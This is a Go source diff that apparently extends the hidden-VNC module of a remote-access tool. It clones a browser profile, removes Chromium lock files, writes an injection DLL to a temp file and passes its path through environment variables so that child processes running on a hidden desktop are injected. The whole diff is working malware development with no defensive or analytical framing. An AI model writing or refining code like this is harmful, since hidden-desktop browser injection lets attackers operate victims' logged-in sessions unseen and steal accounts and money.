@@ -162,6 +162,13 @@ func StartHVNCBrowserInjected(browser string, exePath string, dllBytes []byte, c
 	}
 	log.Printf("hvnc %s: cloned profile to %s", info.name, cloneDir)
 
+	for _, lockFile := range []string{"SingletonLock", "SingletonCookie", "SingletonSocket"} {
+		lp := filepath.Join(cloneDir, lockFile)
+		if err := os.Remove(lp); err == nil {
+			log.Printf("hvnc %s: removed lock file %s", info.name, lockFile)
+		}
+	}
+
 	return StartHVNCProcessInjected(exePath, dllBytes, realUserData, cloneDir)
 }
 
@@ -598,11 +605,18 @@ func startHVNCProcessInjectedOnThread(filePath string, dllBytes []byte, searchPa
 		return fmt.Errorf("empty DLL bytes")
 	}
 
+	dllTmpPath, err := writeDLLToTemp(dllBytes)
+	if err != nil {
+		return fmt.Errorf("failed to write DLL to temp: %v", err)
+	}
+	log.Printf("hvnc inject: DLL written to %s for child injection", dllTmpPath)
+
 	enableDebugPrivilege()
 
 	// Create the process suspended on the HVNC desktop
-	hProcess, hThread, pid, err := createSuspendedProcessOnDesktop(filePath, searchPath, replacePath)
+	hProcess, hThread, pid, err := createSuspendedProcessOnDesktop(filePath, searchPath, replacePath, dllTmpPath)
 	if err != nil {
+		os.Remove(dllTmpPath)
 		return fmt.Errorf("failed to create suspended process: %v", err)
 	}
 	log.Printf("hvnc inject: created suspended process PID %d", pid)
@@ -635,7 +649,21 @@ func terminateProcess(hProcess uintptr) {
 	kernel32.NewProc("TerminateProcess").Call(hProcess, 1)
 }
 
-func createSuspendedProcessOnDesktop(filePath, searchPath, replacePath string) (hProcess, hThread uintptr, pid uint32, err error) {
+func writeDLLToTemp(dllBytes []byte) (string, error) {
+	f, err := os.CreateTemp("", "hvnc_rdi_*.dll")
+	if err != nil {
+		return "", err
+	}
+	if _, err := f.Write(dllBytes); err != nil {
+		f.Close()
+		os.Remove(f.Name())
+		return "", err
+	}
+	f.Close()
+	return f.Name(), nil
+}
+
+func createSuspendedProcessOnDesktop(filePath, searchPath, replacePath, dllTmpPath string) (hProcess, hThread uintptr, pid uint32, err error) {
 	desktopNamePtr, err := syscall.UTF16PtrFromString(hvncDesktopName)
 	if err != nil {
 		return 0, 0, 0, fmt.Errorf("failed to convert desktop name: %v", err)
@@ -662,7 +690,7 @@ func createSuspendedProcessOnDesktop(filePath, searchPath, replacePath string) (
 	si.dwY = 0
 	si.dwFlags = STARTF_USEPOSITION
 
-	envBlock, err := buildEnvironmentBlock(searchPath, replacePath)
+	envBlock, err := buildEnvironmentBlock(searchPath, replacePath, dllTmpPath)
 	if err != nil {
 		return 0, 0, 0, fmt.Errorf("failed to build environment block: %v", err)
 	}
@@ -689,11 +717,14 @@ func createSuspendedProcessOnDesktop(filePath, searchPath, replacePath string) (
 	return pi.hProcess, pi.hThread, pi.dwProcessId, nil
 }
 
-func buildEnvironmentBlock(searchPath, replacePath string) ([]uint16, error) {
+func buildEnvironmentBlock(searchPath, replacePath, dllTmpPath string) ([]uint16, error) {
 	envStrings := syscall.Environ()
 
 	envStrings = append(envStrings, "RDI_SEARCH_PATH="+searchPath)
 	envStrings = append(envStrings, "RDI_REPLACE_PATH="+replacePath)
+	if dllTmpPath != "" {
+		envStrings = append(envStrings, "RDI_DLL_PATH="+dllTmpPath)
+	}
 
 	var block []uint16
 	for _, s := range envStrings {
